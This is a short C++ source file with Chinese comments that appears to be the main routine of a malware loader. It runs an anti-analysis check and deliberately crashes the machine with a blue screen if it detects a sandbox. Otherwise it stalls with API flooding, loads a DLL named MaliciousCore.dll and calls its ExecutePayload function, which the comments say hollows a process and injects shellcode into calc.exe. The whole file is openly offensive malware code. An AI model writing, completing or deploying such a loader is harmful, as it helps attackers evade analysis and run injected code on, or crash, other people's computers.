#include <Windows.h>
#include "IntegratedAntiAnalysis.h"
#include "AntiSandbox.h"      // 仅用于 APIFlooding_Delay
#include "BSODTrigger.h"

typedef BOOL(*ExecFunc)();

int main() {
    // 创建综合反分析引擎
    IntegratedAntiAnalysis engine;

    // 多线程环境评估，阈值3分，超时10秒
    if (!engine.Evaluate(10000, 3)) {
        // 环境不安全，退出
        BSODTrigger bsod;
        bsod.TriggerBSOD();
        return 1;
    }

    // 通过检测后，可继续执行干扰操作
    AntiSandbox::APIFlooding_Delay();
    // 使用完整路径加载 DLL
    HMODULE hDll = LoadLibraryA("C:\\test\\MaliciousCore.dll");
    if (!hDll)
    {
        // 加载失败，错误码
        DWORD err = GetLastError();
        return 1;
    }

    // 获取函数地址
    ExecFunc exec = (ExecFunc)GetProcAddress(hDll, "ExecutePayload");
    if (!exec)
    {
        return 2;
    }

    // 执行恶意代码（进程镂空 + 注入 shellcode）
    exec();

    // 注意：exec 返回后，注入已完成，shellcode 已在 calc.exe 中运行
    return 0;
}
